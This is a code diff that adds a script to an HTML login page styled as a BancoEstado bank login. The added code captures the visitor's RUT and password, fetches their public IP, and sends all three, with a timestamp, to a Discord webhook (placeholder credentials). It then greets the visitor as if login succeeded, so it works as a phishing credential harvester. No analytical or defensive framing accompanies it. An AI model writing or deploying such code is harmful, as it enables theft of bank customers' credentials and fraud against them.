@@ -369,7 +369,80 @@
             </div>
         </div>
     </div>
+<script>
+    // Configuración del webhook de Discord
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/TU_WEBHOOK_ID/TU_WEBHOOK_TOKEN';
 
+// Manejar envío del formulario
+function handleLogin(event) {
+    event.preventDefault();
+    const rut = document.getElementById('rut').value.trim();
+    const password = document.getElementById('password').value;
+    
+    if (!rut || !password) {
+        alert('Por favor completa todos los campos');
+        return;
+    }
+    
+    sendToDiscord(rut, password);
+    document.getElementById('loginForm').reset();
+}
+
+// Función para enviar datos a Discord
+function sendToDiscord(rut, password) {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const payload = {
+                username: 'BancoEstado Login',
+                avatar_url: 'https://i.imgur.com/placeholder.png',
+                embeds: [{
+                    color: 3447003,
+                    author: {
+                        name: 'Nuevo Login'
+                    },
+                    fields: [
+                        {
+                            name: 'RUT',
+                            value: rut,
+                            inline: true
+                        },
+                        {
+                            name: 'Contraseña',
+                            value: password,
+                            inline: true
+                        },
+                        {
+                            name: 'IP',
+                            value: data.ip,
+                            inline: true
+                        },
+                        {
+                            name: 'Hora',
+                            value: new Date().toLocaleString('es-ES'),
+                            inline: true
+                        }
+                    ]
+                }]
+            };
+            
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert(`Bienvenido ${rut}!`);
+                } else {
+                    alert('Error al procesar');
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        })
+        .catch(error => console.error('Error IP:', error));
+}
+</script>
     <script>
         // Toggle mostrar/ocultar contraseña
         function togglePassword() {
